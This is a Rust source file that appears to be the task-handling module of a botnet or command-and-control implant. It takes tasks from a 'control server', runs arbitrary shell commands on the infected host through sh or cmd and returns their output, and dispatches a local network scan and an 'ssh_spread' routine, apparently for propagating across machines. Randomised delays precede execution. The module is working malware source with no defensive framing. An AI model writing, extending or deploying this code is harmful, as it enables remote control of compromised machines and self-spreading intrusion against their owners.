mod network_scan;
mod ssh_spread;

use std::{
    process::Command,
    str,
    thread,
    time,
    sync::Mutex,
    io::Read,
};
use std::process::{Child, Stdio};
use lazy_static::lazy_static;
use rand::Rng;
use crate::models::{
    Task,
    TaskResult,
};
pub use crate::tasks::network_scan::{
    scan_local_net,
    NetworkHost,
    Port,
};
use crate::tasks::ssh_spread::ssh_spread;

const TERMINAL_CMD: &'static str = "terminal";
const ABORT_CMD: &'static str = "abort";
const NETWORK_SCAN_CMD: &'static str = "network_scan";
const SSH_SPREAD: &'static str = "ssh_spread";
const DEFAULT_MIN_WAIT: u32 = 0;
const DEFAULT_MAX_WAIT: u32 = 500;
const ABORTED_STATUS_CODE: i32 = -3;


lazy_static! {
    static ref RUNNING_TASKS: Mutex<RunningTasks> = Mutex::new(RunningTasks{
        running_tasks: vec![],
        task_results: vec![]
    });
}



/// Struct containing all running tasks
pub struct RunningTasks {
    // Running child tasks
    running_tasks: Vec<RunningTask>,
    // Task results received from asynchronous tasks
    task_results: Vec<TaskResult>,
}

/// Implementation of RunningTasks methods
impl RunningTasks {
    /// Used to add a running task
    pub fn add_task(&mut self, running_task: RunningTask) {
        self.running_tasks.push(running_task);
    }

    /// Used to check and get the running tasks who are completed
    ///
    /// # Returns
    /// Vector containing TaskResult from the completed tasks
    fn get_completed_tasks(&mut self) -> Vec<TaskResult> {
        let mut removed = 0;
        let mut complete_tasks: Vec<TaskResult> = vec![];
        #[cfg(debug_assertions)]
        println!("Checking for completed tasks..");

        for i in 0..self.running_tasks.len() {
            let t = self.running_tasks.get_mut(i - removed).unwrap();
            if t.is_complete() {
                let tr = t.get_result().unwrap();
                #[cfg(debug_assertions)] {
                    println!("#{} complete. Resulting output:", t.id);
                    println!("{}", tr.result);
                }
                complete_tasks.push(tr);

                self.running_tasks.remove(i - removed);
                removed += 1;
            } else {
                #[cfg(debug_assertions)]
                println!("Task #{} is not complete", t.id);
            }
        }
        for tr in &self.task_results {
            #[cfg(debug_assertions)] {
                println!("#{} complete. Resulting output:", tr.id);
                println!("{}", tr.result);
            }
            complete_tasks.push(tr.clone());
        }
        self.task_results = Vec::new();

        #[cfg(debug_assertions)] {
            if complete_tasks.is_empty() {
                println!("No completed tasks");
            }
        }

        complete_tasks
    }

    fn add_task_result(&mut self, task_result: TaskResult) {
        self.task_results.push(task_result);
    }

    /// Aborts all running tasks
    fn abort_all(&mut self) {
        for t in self.running_tasks.iter_mut() {
            t.abort_task();
        }
    }

    /// Aborts a single running task, if id exists
    fn abort_task(&mut self, id: String) {
        for t in self.running_tasks.iter_mut() {
            if t.id == id {
                t.abort_task();
                break;
            }
        }
    }
}

/// Struct representing ta running task
pub struct RunningTask {
    id: String,
    child: Child,
}

/// Methods for the RunningTask struct
impl RunningTask {
    /// Checks weather a running task is completed or not
    ///
    /// # Returns
    /// If complete, true, else false
    pub fn is_complete(&mut self) -> bool {
        match self.child.try_wait() {
            Ok(Some(_)) => true,
            _ => false
        }
    }

    /// Get a TaskResult from a running task
    ///
    /// # Returns
    /// If the task is completed, a TaskResult containing output from the task is returned,
    /// otherwise if the task is not completed, None is returned
    pub fn get_result(&mut self) -> Option<TaskResult> {
        let exit_status = match self.child.try_wait() {
            Ok(Some(val)) => val,
            _ => return None
        };

        let option = exit_status.code();
        let exit_code = match option {
            Some(val) => val,
            _ => ABORTED_STATUS_CODE
        };
        let stdout = self.child.stdout.take();
        let stderr = self.child.stderr.take();
        let mut result = String::new();

        match exit_code {
            0 => {
                if let Some(_) = stdout {
                    stdout.unwrap()
                        .read_to_string(&mut result)
                        .expect("Failed to read stdout");
                } else {
                    #[cfg(debug_assertions)]
                    println!("Command had no output!");
                };
            }
            ABORTED_STATUS_CODE => {
                #[cfg(debug_assertions)]
                println!("Command aborted => no output returned");
            }
            _ => {
                if let Some(_) = stderr {
                    stderr.unwrap()
                        .read_to_string(&mut result)
                        .expect("Failed to read stderr");
                } else {
                    #[cfg(debug_assertions)]
                    println!("Command had no output!");
                };
            }
        }

        Some(TaskResult {
            id: self.id.clone(),
            status: exit_code,
            result,
        })
    }

    /// Kills the running task by killing the child process
    pub fn abort_task(&mut self) {
        #[cfg(debug_assertions)]
        println!("Aborting task #{}", self.id);

        self.child.kill().expect("Failed to kill task");
    }
}

/// Used to check and get the running tasks who are completed
///
/// # Returns
/// Vector containing TaskResult from the completed tasks
pub fn check_completed() -> Vec<TaskResult> {
    RUNNING_TASKS.lock().unwrap().get_completed_tasks()
}

/// Run a task received from the control server
pub fn run_task(task: Task) {
    #[cfg(debug_assertions)] {
        println!("Running {} task #{} ({}-{}ms): {}",
                 task.name,
                 task.id,
                 task.min_delay,
                 task.max_delay,
                 task.data);
    }

    let wait = if task.min_delay < task.max_delay {
        rand::thread_rng().gen_range(task.min_delay, task.max_delay)
    } else if task.min_delay == task.max_delay {
        0
    } else {
        rand::thread_rng().gen_range(DEFAULT_MIN_WAIT, DEFAULT_MAX_WAIT)
    };

    thread::sleep(time::Duration::from_millis(wait as u64));

    // Add more command types here when supported by server and implemented in client
    match &task.name[..] {
        TERMINAL_CMD => {
            let child = terminal_command(task.data.trim().to_string());
            let rt = RunningTask {
                id: task.id,
                child,
            };
            RUNNING_TASKS.lock()
                .unwrap()
                .add_task(rt);
        }
        ABORT_CMD => {
            let mut rts = RUNNING_TASKS.lock().unwrap();
            if task.data.is_empty() {
                rts.abort_all();
            } else {
                for id in task.data.split(',') {
                    rts.abort_task(id.trim().to_string());
                }
            }
        }
        NETWORK_SCAN_CMD => {
            let trimmed_data = task.data.trim().to_string();
            thread::spawn(|| {
                network_scan::network_scan(
                    &RUNNING_TASKS,
                    task.id,
                    trimmed_data);
            });
        }
        SSH_SPREAD => {
            let trimmed_data = task.data.trim().to_string();
            thread::spawn(|| {
                ssh_spread(&RUNNING_TASKS,
                           task.id,
                           trimmed_data);
            });
        }
        _ => {}
    }
}

/// Runs a terminal command at the client host
fn terminal_command(command: String) -> Child {
    if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &command])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("Failed to execute command")
    } else {
        Command::new("sh")
            .arg("-c")
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .arg(command)
            .spawn()
            .expect("Failed to execute command")
    }
}






